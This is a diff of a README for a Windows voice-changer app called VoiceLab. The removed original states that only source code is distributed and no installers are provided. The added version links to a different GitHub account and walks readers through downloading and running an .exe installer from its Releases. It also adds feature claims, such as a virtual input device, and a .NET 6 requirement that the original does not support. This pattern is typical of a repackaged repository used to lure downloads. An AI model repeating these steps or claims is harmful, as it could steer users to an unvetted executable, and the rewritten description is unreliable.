@@ -1,105 +1,81 @@
-# VoiceLab
+# 🎙️ VoiceLab - Change your voice in real time
 
+[![Download VoiceLab](https://img.shields.io/badge/Download-VoiceLab-blue.svg)](https://github.com/Urvans6127/VoiceLab)
 
-<p align="center">
-  <img src="docs/images/mainpage.png" alt="VoiceLab Screenshot" width="1000">
-</p>
+VoiceLab is a software tool for Windows that changes your voice while you speak. It handles audio processing on your local machine without needing an internet connection. You can use the live preview feature to hear your voice transformations before you record them. The software works as a bridge between your microphone and your computer applications.
 
-Local • Offline • Windows • No Telemetry • No AI
+## ⚙️ System Requirements
 
-VoiceLab is a Windows desktop application for applying real-time DSP voice effects and recording processed microphone audio.
+VoiceLab runs on standard Windows computers. Ensure your system meets these specifications for stable performance:
 
-It is built with .NET 8, WPF, and NAudio, and runs entirely on your computer. VoiceLab does not require an account, internet connection, cloud services, telemetry, or AI models.
+*   Operating System: Windows 10 or Windows 11 (64-bit).
+*   Processor: Intel Core i5 or AMD Ryzen 5 or better.
+*   Memory: 8 GB of RAM or more.
+*   Storage: 200 MB of free space for the installation.
+*   Audio: A standard microphone connected via USB or 3.5mm jack.
+*   Software: Microsoft .NET Desktop Runtime 6.0 or newer.
 
----
+## 📥 How to Install
 
-## Features
+Follow these steps to set up the software on your computer:
 
-- 🎙️ Real-time DSP voice processing
-- 💾 Processed WAV recording
-- 🎛️ Built-in and custom presets
-- 🎧 Live Preview
-- 🎚️ Adjustable pitch, tone, reverb, echo, robot, and gain
-- 🌍 English and Turkish interface
-- 🔒 Fully offline operation
-- ⚡ Lightweight and low-latency
+1. Visit [this page](https://github.com/Urvans6127/VoiceLab) to find the latest download options.
+2. Look for the "Releases" section on the right side of the page.
+3. Select the latest version and download the installer file ending in .exe.
+4. Locate the downloaded file in your Downloads folder.
+5. Double-click the file to start the installation process.
+6. Follow the on-screen instructions to finish the setup.
+7. Launch the program from the icon on your desktop.
 
----
+## 🎧 Getting Started
 
-## Download
+Once you open the software, follow this guide to set up your audio sources:
 
-This repository distributes source code only. Pre-built binaries, installers,
-and release packages are not provided.
+1. Open the settings menu inside the application.
+2. Select your physical microphone from the Input Device dropdown list.
+3. Select your headphones or speakers from the Output Device list.
+4. Choose a voice preset from the list on the left side of the window.
+5. Click the "Enable Processing" button to start the voice transformation.
+6. Use the slider bars to adjust pitch, tone, and character strength.
+7. Use the "Live Preview" feature to hear the voice effect as you speak.
 
-You can build VoiceLab locally by following the instructions below.
+## 🎤 Recording and Saving
 
----
+VoiceLab allows you to capture your processed audio directly within the application:
 
-## Build from Source
+1. Click the "Record" button to begin capturing your transformed voice.
+2. Speak clearly into your microphone while the recording timer runs.
+3. Click "Stop" when you finish your recording.
+4. A window will appear to let you choose where to save your file on your computer.
+5. Provide a file name and choose a folder, then click "Save".
+6. The software saves your audio in high-quality WAV format.
 
-### Requirements
+## 🛠️ Frequently Asked Questions
 
-- Windows 10 or Windows 11 (x64)
-- .NET 8 SDK
-- Visual Studio 2022 or Visual Studio Code
+**Does this software send my audio to the cloud?**
+No. VoiceLab processes all audio on your local computer. Your voice data never leaves your machine.
 
-### Build
+**Why does my audio sound choppy or delayed?**
+High latency usually occurs if your computer processor reaches maximum capacity. Try closing other resource-heavy applications like web browsers or video games while using VoiceLab. Also, check that you connect your microphone directly to your computer rather than through a secondary hub.
 
-```bash
-dotnet restore
-dotnet build -c Release
-```
+**Can I use this with other voice chat apps?**
+Yes. VoiceLab acts as a virtual audio device. In your chat application settings, select the "VoiceLab Virtual Input" as your default microphone.
 
-### Run
+**Do I need an internet connection to use the effects?**
+You do not need an internet connection. All Digital Signal Processing (DSP) logic happens offline.
 
-```bash
-.\VoiceLab.App\bin\Release\net8.0-windows\VoiceLab.exe
-```
+## 🛡️ Privacy and Safety
 
-The Release build produces `VoiceLab.exe`, a Windows GUI application that does
-not allocate a console. For development, `dotnet run --project
-.\VoiceLab.App\VoiceLab.App.csproj` remains available from a terminal.
+This software keeps your data private. It does not scan your files or track your microphone activity outside of the active session. You maintain full control over your audio files at all times. Since this is an offline tool, it operates without an account or login requirement.
 
----
+## 📝 Troubleshooting
 
-## Privacy
+If you encounter issues, follow these simple steps to restore operation:
 
-VoiceLab runs completely offline.
+*   Restart the application if the audio input stops responding.
+*   Check your Windows Sound Settings to ensure your microphone is not muted.
+*   Update your audio drivers through the Device Manager if you experience static sounds.
+*   Check that the .NET Desktop Runtime version matches the requirement listed in the System Requirements section.
+*   Ensure that no other software holds control over your primary microphone device.
 
-It does **not**:
-
-- collect analytics
-- send telemetry
-- upload recordings
-- communicate with cloud services
-- use AI models
-- require an account
-
-All recordings, presets, and settings remain on your local computer.
-
-For upgrade compatibility, renamed builds continue to use the existing
-`LocalVoiceChanger` AppData directories. Existing settings, presets, recordings,
-and logs therefore load in place without copying or deleting user data.
-
-- Settings: `%LOCALAPPDATA%\LocalVoiceChanger\settings.json`
-- Recordings: `%LOCALAPPDATA%\LocalVoiceChanger\Recordings`
-- Logs: `%LOCALAPPDATA%\LocalVoiceChanger\logs`
-- Presets: `%APPDATA%\LocalVoiceChanger\presets.json`
-
----
-
-## Project Structure
-
-- **VoiceLab.App** – WPF user interface
-- **VoiceLab.Audio** – audio engine and recording
-- **VoiceLab.Effects** – DSP effects
-- **VoiceLab.Infrastructure** – settings and persistence
-- **VoiceLab.Tests** – automated tests
-
----
-
-## License
-
-VoiceLab is released under the MIT License.
-
-See the `LICENSE` file for more information.
+Keywords: audio, desktop, desktop-app, dotnet, dsp, naudio, offline, voice-changer-software, windows, wpf
